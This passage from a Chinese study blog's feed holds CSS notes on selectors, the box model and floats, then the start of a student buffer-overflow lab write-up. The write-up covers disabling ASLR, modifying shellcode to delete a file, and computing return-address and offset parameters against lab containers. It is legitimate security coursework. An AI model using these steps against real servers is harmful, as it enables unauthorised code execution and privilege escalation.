class="line"><span class="language-css">      <span class="attribute">outline</span>: <span class="number">2px</span> solid black;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-pseudo">:first</span>-child&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">outline</span>: deeppink outset <span class="number">2px</span>; </span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.item</span><span class="selector-pseudo">:not</span>(<span class="selector-tag">h2</span>)&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:deeppink;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>其他常用的伪类类别<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span>一年级</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span>二年级</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span>三年级</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lg&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span>四年级</span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>：checked:勾选状态，用户单选，复选和下拉菜单，当某一项或多项被勾选时<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>：disabeld:禁用状态，作用在被禁用的元素之上<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：enabled:作用于所有未被禁用的元素之上<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：empty:作用在所有包含子元素或文字的元素之上<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：first-child:作用于一组平行元素的第一个元素节点<span class="tag">&lt;/<span class="name">li</span>&gt;</span>    针对于同一个父亲的孩子</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：last-child:作用于一组平行元素的最后一个元素节点<span class="tag">&lt;/<span class="name">li</span>&gt;</span>   针对同一个父亲的孩子</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：nth-child(n):作用于一组平行元素的第n个元素节点<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：nth-last-child(n):作用于一组平行元素的倒数第n个元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：first-of-type:选择同类元素中的第一个元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span>              只针对同类</span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：last-of-type: 选择同类元素中的最后一个元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：nth-of-type(n):选择同类元素中的第n个元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：nth-last-of-type(n):选择同类元素中的倒数第n个元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>：not(tag):排除指定tag元素之外的元素<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span>：only-child:用于选择没有兄弟的元素， 即它是父元素中的独生子节点<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>表单控件</p></li><li><p>target：锚链接</p></li><li><p>beforeafter：前后位置伪元素选择器</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">td</span><span class="selector-pseudo">:last-child</span><span class="selector-pseudo">::before</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">content</span>:<span class="string">&quot;人民币&quot;</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">td</span><span class="selector-pseudo">:last-child</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">content</span>: <span class="string">&quot;元&quot;</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>伪元素的用法： ：：元素名<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>伪元素是用来在选中元素的前后添加元素的<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>川大小食堂价目表<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>菜名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>单价<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>：：first-letter</p></li><li><p>：：first-line</p></li><li><p>placeholder</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">::placeholder&#123;</span><br><span class="line">    text-decoration: line-through;</span><br><span class="line">    color:red;</span><br><span class="line">    font-weight:900;</span><br><span class="line">  &#125;</span><br><span class="line">  ::selection &#123;</span><br><span class="line">    background-color: black;</span><br><span class="line">    color:aliceblue;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="层叠、继承"><a href="#层叠、继承" class="headerlink" title="层叠、继承"></a>层叠、继承</h1><ul><li><p>继承</p><ul><li>继承的优先级低</li><li>可以从父辈继承样式</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.grandpa</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">3rem</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.pa</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:deeppink;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;great-grandpa&quot;</span>&gt;</span></span><br><span class="line">    曾爷爷我穷，没啥传的</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;grandpa&quot;</span>&gt;</span></span><br><span class="line">      爷爷我把字体大小传递下去</span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;pa&quot;</span>&gt;</span></span><br><span class="line">        爸爸我把颜色传递下去</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;wa&quot;</span>&gt;</span></span><br><span class="line">          娃我能拿到爷爷的字体大小和爸爸的颜色</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>绝大部分属性都可以继承、</p></li><li><p>会被默认样式表覆盖</p></li><li><p>继承实现很简单，不用显示指定；但是为了提高优先级，可以显示指定继承</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:darkgoldenrod;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span></span><br><span class="line"><span class="language-css">    &#125; </span></span><br><span class="line"><span class="language-css">    <span class="comment">/* a&#123;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">      color:inherit;</span></span></span><br><span class="line"><span class="comment"><span class="language-css">    &#125;  */</span></span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>继承来的属性地位很低<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    你好,<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>我是链接，但是我继承的内容被默认属性给覆盖了<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>通配符样式表是优先级最低的，但是都比继承高</p></li></ul></li><li><p>层叠</p><ul><li>当一个元素有多个样式时，执行优先级和特指度、样式位置（后&gt;前）确定元素最终的样式。</li><li>样式来源：（后&gt;前）<ul><li><img src="/2023/10/11/CSS%E8%BF%9B%E9%98%B6/image-20231011202725666.png" alt="image-20231011202725666"></li><li>!important:最后的样式，指定的</li></ul></li><li>特指度：<ul><li>I&gt;C&gt;E（标签）</li><li>伪类：c</li><li>伪元素：e</li></ul></li></ul></li></ul><h1 id="盒子"><a href="#盒子" class="headerlink" title="盒子"></a>盒子</h1><ul><li><p>组成;：<img src="/2023/10/11/CSS%E8%BF%9B%E9%98%B6/image-20231011203725379.png" alt="image-20231011203725379"></p></li><li><p>padding：从上开始顺时针设定</p><p>- </p>   <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> .box2 &#123;</span><br><span class="line">      padding:20px;<span class="comment">&lt;!--20,30,50,60 --&gt;</span></span><br><span class="line">    &#125;</span><br><span class="line">    .box3,.box4&#123;</span><br><span class="line">      margin:10px 20px;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span>&gt;</span>盒子1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span>&gt;</span>盒子2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box3&quot;</span>&gt;</span>盒子3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box4&quot;</span>&gt;</span>盒子4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>height(可伸缩)</p></li><li><p>width（要设计，不设计滚动条）不同浏览器含义不一样（除ie包含margin，其余只有content）</p></li><li><p>未设定元素width，默认继承父类宽度</p></li><li><p>width一定，改变margin padding  盒子向外扩张</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.border</span>&#123;</span><br><span class="line">     <span class="attribute">width</span>:<span class="number">100px</span>;</span><br><span class="line">     <span class="attribute">height</span>:<span class="number">100px</span>;</span><br><span class="line">     <span class="attribute">background-color</span>: deeppink;</span><br><span class="line">     <span class="attribute">color</span>:yellowgreen;</span><br><span class="line">     <span class="attribute">padding</span>:<span class="number">20px</span>;</span><br><span class="line">     <span class="attribute">border</span>:<span class="number">20px</span> solid brown;</span><br><span class="line">     <span class="attribute">box-sizing</span>: border-box;   <span class="comment">/*保证盒子整体宽度不变， content收缩*/</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>margin：左右叠加，上下取最大</p></li><li><p>border集成化设定：</p><p>- </p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">      </span><br><span class="line"><span class="selector-tag">h1</span>&#123;</span><br><span class="line">     <span class="attribute">border</span>:<span class="number">10px</span> inset yellowgreen;</span><br><span class="line">     <span class="attribute">margin</span>:<span class="number">5px</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><p>border分开设置：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"> <span class="selector-tag">p</span>&#123;</span><br><span class="line">      <span class="attribute">margin</span>:<span class="number">1px</span> <span class="number">2px</span> <span class="number">3px</span> <span class="number">4px</span>;</span><br><span class="line">      <span class="attribute">border-color</span>: black yellowgreen darkgoldenrod burlywood;</span><br><span class="line">      <span class="attribute">border-style</span>: dashed outset;</span><br><span class="line">      <span class="attribute">border-width</span>: <span class="number">10px</span> <span class="number">20px</span> <span class="number">30px</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*margin: 1px 2px 3px 4px;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这行代码设置了 &lt;p&gt; 元素的外边距（margin）。四个值分别表示上、右、下、左的外边距，按顺序为1px、2px、3px、4px。</span></span><br><span class="line"><span class="comment">border-color: black yellowgreen darkgoldenrod burlywood;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这行代码设置了 &lt;p&gt; 元素的边框颜色。四个值分别对应边框的上、右、下、左，颜色分别为黑色（black）、黄绿色（yellowgreen）、深金黄色（darkgoldenrod）、实木色（burlywood）。</span></span><br><span class="line"><span class="comment">border-style: dashed outset;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这行代码设置了 &lt;p&gt; 元素的边框样式。两个值分别对应边框的上下样式，为虚线（dashed）和外凸边框（outset）。</span></span><br><span class="line"><span class="comment">border-width: 10px 20px 30px;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这行代码设置了 &lt;p&gt; 元素的边框宽度。三个值分别对应边框的上、右左和下，宽度分别为10px、20px、30px。*/</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>display：元素的排列方式</p><p>- </p>  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;<span class="attribute">display</span>: 设置元素的显示方式&lt;/title&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .in&#123;</span><br><span class="line">      <span class="attribute">display</span>: inline;</span><br><span class="line">      <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">a</span>&#123;</span><br><span class="line">      <span class="attribute">display</span>:block;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.ib</span>&#123;</span><br><span class="line">      <span class="attribute">display</span>: inline-block;</span><br><span class="line">      <span class="attribute">border</span>:<span class="number">1px</span> solid black;</span><br><span class="line">      <span class="attribute">margin</span>:<span class="number">1px</span>;</span><br><span class="line">      <span class="attribute">height</span>:<span class="number">50px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br></pre></td></tr></table></figure><ul><li>inline-block：宽度由content决定，高度起作用</li><li>block：一个元素独占一行</li><li>inline：同一行，高度不起作用</li><li>none：秘密信息，调试；不显示位置不保留</li></ul></li></ul></li></ul><h1 id="浮动"><a href="#浮动" class="headerlink" title="浮动"></a>浮动</h1><ul><li><p>标准文档流：块从上到下，inline从左到右</p></li><li><p>float属性设置了，</p><ul><li>display自动变成inline-block</li><li>脱离标准文档流</li><li>图层最上方</li><li>不对文字遮挡</li><li>遇到前面的元素边框停下</li></ul></li><li><p>作用：</p><ul><li>图文绕排</li></ul><p><img src="/2023/10/11/CSS%E8%BF%9B%E9%98%B6/image-20231011212508955.png" alt="image-20231011212508955"></p><p>图像在文字上方，图向左浮动</p><ul><li>并排块元素<ul><li>全部左浮动、左右</li></ul></li><li>布局</li></ul></li><li><p>问题：</p><ul><li><p>高度坍塌：父容器靠孩子撑起来，若孩子全部浮动，父容器高度为零</p><ul><li><p>解决：父容器也做浮动</p></li><li><p>overflow：只要超过盒子宽度，就删除</p></li><li> <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">     <span class="attribute">border</span>:<span class="number">5px</span> solid black;</span><br><span class="line">     <span class="comment">/* float:left; */</span></span><br><span class="line">     <span class="comment">/* overflow: hidden; */</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.child1</span> &#123;</span><br><span class="line">     <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">background-color</span>: deeppink;</span><br><span class="line">     <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="selector-class">.child2</span> &#123;</span><br><span class="line">     <span class="attribute">width</span>:<span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">     <span class="attribute">background-color</span>: burlywood;</span><br><span class="line">    <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li><li><p>清除浮动：</p><p>- </p>   <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/* .transparent&#123;</span></span><br><span class="line"><span class="comment">     clear:both;</span></span><br><span class="line"><span class="comment">    &#125; */</span></span><br><span class="line">  </span><br><span class="line"> &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">  &lt;<span class="selector-tag">div</span> class=&quot;parent&quot;&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;child1&quot;&gt;child1&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;<span class="selector-tag">div</span> class=&quot;child2&quot;&gt;child2&lt;/<span class="selector-tag">div</span>&gt;</span><br><span class="line">    &lt;!-- &lt;<span class="selector-tag">div</span> class=&quot;transparent&quot;&gt;&lt;/<span class="selector-tag">div</span>&gt; --&gt;</span><br><span class="line">   &lt;/<span class="selector-tag">div</span>&gt;</span><br></pre></td></tr></table></figure><p>   元素左边、右边都不能有浮动的盒子</p><ul><li>inline-block不要使用float（文字跑出）</li></ul></li></ul></li></ul></li></ul><h1 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h1><ul><li>盒子的偏移</li><li>position：relative<ul><li>表示与原始的位置相比的偏移</li></ul></li><li>position：fix<ul><li>相对于页面的定位</li></ul></li><li>position：absolute<ul><li>定位基准：父元素（设置了position：relative），如果没有，那么就按照body啦定位</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 盒子模型 </tag>
            
            <tag> 浮动 </tag>
            
            <tag> 伪类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-作业题目"><a href="#1-作业题目" class="headerlink" title="1    作业题目"></a>1    作业题目</h1><p>缓冲区溢出</p><p>本实验的学习目标是让学生将从课堂上学到的有关缓冲区溢出漏洞的知识进行实践，从而获得有关该漏洞的第一手经验。缓冲区溢出是指程序试图将数据写入预先分配的固定长度缓冲区边界之外的情况。恶意用户可利用此漏洞改变程序的流控制，甚至执行任意代码。此漏洞是由于数据存储（如缓冲区）和控件存储（如返回地址）的混合造成的：数据部分的溢出会影响程序的控制流，因为溢出会改变返回地址。</p><p>本实验将提供四台不同的服务器，每台服务器运行一个带有缓冲区溢出漏洞的程序。实验任务是开发一个利用漏洞的程序，并最终获得这些服务器上的root权限。除了进行这些攻击实验之外，还将试验几种针对缓冲区溢出攻击的对策。学生需要评估这些计划是否有效，并解释原因。</p><h1 id="2-实验步骤及结果"><a href="#2-实验步骤及结果" class="headerlink" title="2    实验步骤及结果"></a>2    实验步骤及结果</h1><h1 id="一、-实验环境准备："><a href="#一、-实验环境准备：" class="headerlink" title="一、   实验环境准备："></a>一、   实验环境准备：</h1><ol><li>在开始这个实验之前，我们需要确保关闭地址随机化对策，否则，攻击将很困难。可以使用以下命令执行此操作，以后便于不断调试：   <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121043134.png" alt="image-20231011121043134"></li></ol><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121106389.png" alt="image-20231011121106389"></p><ol start="2"><li>阅读server.c明白实验环境原理：</li></ol><p>关键代码解释：</p><p><img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121117177.png" alt="image-20231011121117177"> </p><p>上述代码表示在建立了链接以后，创建了一个子进程，子进程使用 dup2 将标准输入重定向到与客户端通信的套接字。也就是说，标准输入内容由远程用户决定，这也是我们可以利用的地方。</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121124037.png" alt="image-20231011121124037"></p><p>上述代码表示：通过 execle 执行程序 “stack”，并传递随机生成的环境变量数组。</p><p>总体功能：此程序创建了一个基于TCP的服务器，监听指定端口（9090），用于接受连接并在子进程中执行名为 “stack” 的程序，这个服务器还试图在生成子进程时随机生成一些环境变量，以增加栈的随机性。</p><ol start="3"><li>阅读并理解stack.c程序：</li></ol><p>这个实验室中使用的易受攻击的程序名为 stack.c，位于服务器代码文件夹中。这个程序有一个缓冲区溢出漏洞，我们的目的式利用这个漏洞并获得根特权。以下是部分stack.c代码：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121147825.png" alt="image-20231011121147825"></p><p>代码解释：上述程序有缓冲区溢出漏洞。它从标准输入中读取数据，然后将数据传递给函数 bof ()中的另一个缓冲区。原始输入的最大长度可以是517字节，但是 bof ()中的缓冲区只有 BUF SIZE 字节长，小于517。因为 strcpy ()不检查边界，所以会发生缓冲区溢出。因此可以在分配给buffer大小以外的部分构造攻击代码，溢出部分拥有当前用户权限来执行指令。</p><ol start="4"><li>编译</li></ol><p>编译stack.c文件，只不过还需要使用-fno-stack-protector 和 -z execstack来关闭堆栈保护器和不可执行的堆栈保护。（已写入makefile）</p><p>接下来make一下：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121205120.png" alt="image-20231011121205120"></p><ol start="5"><li>创建容器，启动并检查：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121213119.png" alt="image-20231011121213119"></p><p>创建成功：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121218555.png" alt="image-20231011121218555"></p><p>启动容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121224725.png" alt="image-20231011121224725"></p><p>现在四个服务均正常启动</p><p>关闭容器：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121230224.png" alt="image-20231011121230224"></p><p>至此环境准备完成。</p><h1 id="二、-TASK1：熟悉ShellCode"><a href="#二、-TASK1：熟悉ShellCode" class="headerlink" title="二、   TASK1：熟悉ShellCode"></a>二、   TASK1：熟悉ShellCode</h1><ol><li>阅读通用的shellcode代码（32位为例）：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121243242.png" alt="image-20231011121243242"></p><p>根据实验手册解释，Shell 代码运行“&#x2F;bin&#x2F;bash”shell 程序 ，但它有两个参数“-c”和一个命令字符串(红框部分)。这表明 shell 程序将运行第二个参数中的命令。这些字符串末尾的 * 只是一个占位符，在执行 shell 代码期间，它将被一个0x00字节替换。</p><ol start="2"><li>实现删除功能：</li></ol><p>先新建一个测试删除的文件“test.txt”：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121254930.png" alt="image-20231011121254930"></p><p>修改shellcode的命令，其中要注意的是，由于 argv []数组的占位符的起始位置(就在命令字符串之后)是在 shell 代码的二进制部分中硬编码的，即已经被写死，所以*的位置要保持不变：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121315030.png" alt="image-20231011121315030"></p><ol start="3"><li>测试删除功能：</li></ol><p>根据readme的提示进行操作：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121324922.png" alt="image-20231011121324922"></p><h1 id="三、-Task-2-Level-1-Attack"><a href="#三、-Task-2-Level-1-Attack" class="headerlink" title="三、   Task 2: Level-1 Attack"></a>三、   Task 2: Level-1 Attack</h1><ol><li>环境准备，启动docker中的第一个server，ip端口为：10.9.0.5 9090：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121335941.png" alt="image-20231011121335941"></p><ol start="2"><li>良性消息测试：输入hello字符串查看正常输出，观察ebp的值：</li></ol><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121341808.png" alt="image-20231011121341808"></p><ol start="3"><li>构造攻击文件（32位）：</li></ol><p>Step1：先测试exploit.py生成的badfile在server中的情况如何：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121352447.png" alt="image-20231011121352447"></p><p>Setp2：画出函数调用的栈帧图：</p><p> <img src="/2023/10/11/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20231011121400111.png" alt="image-20231011121400111"></p><p>利用shellcode的最核心一点就是在执行完函数以后，esp+4（指向返回地址的下一个地址）是固定的指令，而它刚好可以让esp回到父函数栈顶；ret一执行，程序就会跳到esp所指位置，而实验所给的shellcode填充的是NOP指令，也就是会cpu什么也不做，一直跳转下一条指令，所以只要shellcode的返回地址足够高，就一定会被执行到。。</p><p>Step3：分析得出在exploit.py中需要修改的参数</p><p>​     Ret为shellcode的入口地址：ebp+8（或更高）</p><p>​     Offset为ret的偏移值：ebp-buffer+4</p><p>​     Start：517-len(shellcode)，把badfile中的后面部分替换为攻击代码</p><p> <img 